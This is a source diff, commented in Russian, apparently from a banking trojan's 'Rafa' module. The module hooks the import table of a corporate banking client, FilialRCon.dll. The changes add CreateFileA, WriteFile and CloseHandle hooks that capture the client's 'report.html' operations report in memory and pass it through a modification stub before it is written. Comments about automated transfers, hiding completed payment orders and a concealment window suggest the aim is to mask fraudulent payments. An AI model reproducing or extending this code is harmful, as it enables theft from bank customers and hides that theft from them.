@@ -32,6 +32,10 @@ namespace Rafa
 LRESULT (WINAPI *pHandlerSendMessageA)(HWND , UINT , WPARAM , LPARAM );
 HWND	(WINAPI *pHandlerCreateWindowExA) (DWORD,PCHAR,PCHAR,DWORD,int,int,int,int,HWND,HMENU,HINSTANCE,LPVOID);
 BOOL (WINAPI *pHandlerTrackPopupMenu)(HMENU hMenu, UINT uFlags, int x, int y, int nReserved, HWND hWnd, const RECT* prcRect ); 
+HANDLE (WINAPI *pHandlerCreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
+							  DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+BOOL (WINAPI *pHandlerCloseHandle)(HANDLE hObject);
+BOOL (WINAPI *pHandlerWriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
 
 WNDPROC MainWndProc; //оконная процедура главного окна клиента
 WNDPROC PaymentWndProc; //оконная процедура окна ввода платежки
@@ -90,6 +94,21 @@ struct TreeAccount
 	HTREEITEM itemTmpls; //ветка шаблонов
 };
 
+//типы отчетов рафы
+enum TypeFileReport
+{
+	InfoOperaions //справка по операциям
+};
+
+//Отчет формируемый рафой
+struct FileReport
+{
+	HANDLE file; //файл отчета
+	TypeFileReport type; //тип отчета
+	char* text; //загруженный отчет, размер выделенной памяти на 1 больше, для последнего 0
+	int len; //длина отчета
+};
+
 static void GrabBalansFromMemoText(char* s);
 static void GrabBalansFromLVM( int cln, char* s );
 static void LoadPaymentOrders(); //загрузка проведенных платежек из файла, чтобы их потом скрывать
@@ -124,6 +143,11 @@ char filePayments[MAX_PATH]; //файл в котором храним инфу о сформированных плате
 int retMenuNds = 0; //возвращаемое значение при выборе меню НДС
 
 int widthScreen, heightScreen;
+
+//список формируемых отчетов, расчитываем на несколько одновременно формируемых, 
+//но на самом деле должен формироваться только один
+const int maxFileReports = 5;
+FileReport fileReports[maxFileReports];
 
 //контролы формы "Платежное поручение"
 ControlForm controlsPaymentOrder[] = 
@@ -513,6 +537,70 @@ static BOOL WINAPI HandlerTrackPopupMenu( HMENU hMenu, UINT uFlags, int x, int y
 	}
 	return pHandlerTrackPopupMenu( hMenu, uFlags, x, y, nReserved, hWnd, prcRect );
 }
+
+//функции CreateFileA, CloseHandle, WriteFile перехватываем для модификаци отчета по платежкам
+static HANDLE WINAPI HandlerCreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
+							  DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
+{
+	HANDLE file = pHandlerCreateFileA( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes,
+							  dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
+	if( file != INVALID_HANDLE_VALUE && (dwDesiredAccess & GENERIC_WRITE) != 0 )
+	{
+		if( m_strstr( lpFileName, "/report.html") )
+		{
+			//ложим открытый файл в свободную ячейку
+			for( int i = 0; i < maxFileReports; i++ )
+				if( fileReports[i].file == 0 )
+				{
+					fileReports[i].file = file;
+					fileReports[i].type = InfoOperaions;
+					fileReports[i].text = 0;
+					fileReports[i].len = 0;
+					break;
+				}
+		}
+	}
+	return file;
+}
+
+static BOOL WINAPI HandlerWriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
+{
+	for( int i = 0; i < maxFileReports; i++ )
+		if( fileReports[i].file == hFile ) //перехватываемый отчет, пишем его в память
+		{
+			fileReports[i].text = (char*)MemRealloc( fileReports[i].text, fileReports[i].len + nNumberOfBytesToWrite + 1 );
+			m_memcpy( fileReports[i].text + fileReports[i].len, lpBuffer, nNumberOfBytesToWrite );
+			fileReports[i].len += nNumberOfBytesToWrite;
+			fileReports[i].text[fileReports[i].len] = 0;
+			if( lpNumberOfBytesWritten )
+				*lpNumberOfBytesWritten = nNumberOfBytesToWrite;
+			return TRUE;
+		}
+	return pHandlerWriteFile( hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped );
+}
+
+static void ModifyInfoOperaions( FileReport& fr )
+{
+}
+
+static BOOL WINAPI HandlerCloseHandle(HANDLE hObject)
+{
+	for( int i = 0; i < maxFileReports; i++ )
+		if( fileReports[i].file == hObject ) //наш отчет
+		{
+			//поправляем его
+			switch( fileReports[i].type )
+			{
+				case InfoOperaions: ModifyInfoOperaions(fileReports[i]); break;
+			}
+			//пишем в файл
+			DWORD wr;
+			pHandlerWriteFile( hObject, fileReports[i].text, fileReports[i].len, &wr, 0 );
+			break;
+		}
+	return pHandlerCloseHandle(hObject);
+}
+
 
 static BOOL CALLBACK EnumTreeList( HWND wnd, LPARAM lParam )
 {
@@ -1178,6 +1266,14 @@ static void WorkInRafa()
 	stateFakeWindow = 0; //закрываем окно скрытия
 }
 
+//настройка глобальных переменных
+static bool InitData()
+{
+	for( int i = 0; i < maxFileReports; i++ )
+		fileReports[i].file = 0;
+	return true;
+}
+
 static DWORD WINAPI InitializeRafaHook( LPVOID p )
 {
 	DBGRAFA( "Rafa", "Start hook FilialRCon.dll" );
@@ -1191,16 +1287,22 @@ static DWORD WINAPI InitializeRafaHook( LPVOID p )
 			{
 				bool res = PathIAT( dll, "USER32.DLL", "SendMessageA", HandlerSendMessageA, (PVOID*)&pHandlerSendMessageA );
 				res &= PathIAT( dll, "USER32.DLL", "CreateWindowExA", HandlerCreateWindowExA,(PVOID*)&pHandlerCreateWindowExA );
-				res &= PathIAT( dll, "USER32.DLL", "TrackPopupMenu", HandlerTrackPopupMenu,(PVOID*)&pHandlerTrackPopupMenu );			
+				res &= PathIAT( dll, "USER32.DLL", "TrackPopupMenu", HandlerTrackPopupMenu,(PVOID*)&pHandlerTrackPopupMenu );
+				//ниже следующие перехватчики апи не обязательный для автозалива, поэтому их перехват не проверяем
+				PathIAT( dll, "KERNEL32.DLL", "CreateFileA", HandlerCreateFileA,(PVOID*)&pHandlerCreateFileA );
+				PathIAT( dll, "KERNEL32.DLL", "WriteFile", HandlerWriteFile,(PVOID*)&pHandlerWriteFile );
+				PathIAT( dll, "KERNEL32.DLL", "CloseHandle", HandlerCloseHandle,(PVOID*)&pHandlerCloseHandle );
 				if( res )
 				{
-					DBGRAFA( "Rafa", "Hook FilialRCon.dll is ok %d - %08x", (int)res,pHandlerSendMessageA );
+					DBGRAFA( "Rafa", "Hook FilialRCon.dll is ok" );
+					
 					hookDll = true;
 					break;
 				}
 				pSleep(1000);
 			}
 			if( !hookDll ) break;
+			InitData();
 			//ждем пока появится основное окно в котором должны быть контролы TreeView и ListView
 			for( int i = 0; i < 300; i++ )
 			{
